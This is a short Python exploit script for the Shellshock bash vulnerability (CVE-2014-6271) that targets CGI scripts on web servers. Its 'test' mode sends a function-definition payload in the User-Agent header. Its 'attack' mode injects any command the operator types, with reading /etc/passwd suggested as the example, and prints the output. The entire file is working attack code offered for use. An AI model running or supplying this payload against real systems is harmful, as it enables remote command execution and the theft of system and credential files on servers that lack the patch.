#!/usr/bin/python3

import requests
import sys

print('##################################################')
print('#         SHOCKINGLY EFFECTIVE SCRIPT            #')
print('#                Use it Wisely                   #')
print('#   Author: Sinan Ozdemir aka synackrstallday    #')
print('#                Version: 1.0                    #')
print('##################################################')


if sys.argv[1] == "-h" or sys.argv[1] == "help" or len(sys.argv) < 5:
    print("Usage effectiveShellShocker.py test http(s)://10.10.10.1 /cgi-bin /calendar.cgi --> to test if the target vulnerable.")
    print("Usage effectiveShellShocker.py attack http(s)://10.10.10.1 /cgi-bin /calendar.cgi --> to attack the target and execute a command.")

def shellshock_test():
    targetURL = sys.argv[2] + sys.argv[3] + sys.argv[4]
    testPayload = '() { :; }; echo;echo "/bin/sh -c echo VULNERABLE"'
    r = requests.get(targetURL, headers = {'user-agent': testPayload})
    if r.status_code == 200:
        print("\033[31;47m" + "{url} is vulnerable to CVE-2014-6271".format(url=targetURL) + "\033[0m")
    else:
        print("\033[34;47m" + "{url} may not be vulnerable to http-shellshock, try with Nmap".format(url=targetURL) + "\033[0m")

def shellshock_exploit():
    targetURL = sys.argv[2] + sys.argv[3] + sys.argv[4]
    command = input("Enter your command like /bin/cat /etc/passwd: ")
    targetPayload = "() { :; };echo; echo; /bin/bash -c '" + command + ";'"
    r = requests.get(targetURL, headers = {'user-agent': targetPayload})
    print("\033[31;103m" + r.text + "\033[0m")

if sys.argv[1] == "test":
    shellshock_test()
    print("Shellshock test has been completed.")
    sys.exit
elif sys.argv[1] == "attack":
    shellshock_exploit()
    print("Shellshock attack has been completed.")
    sys.exit
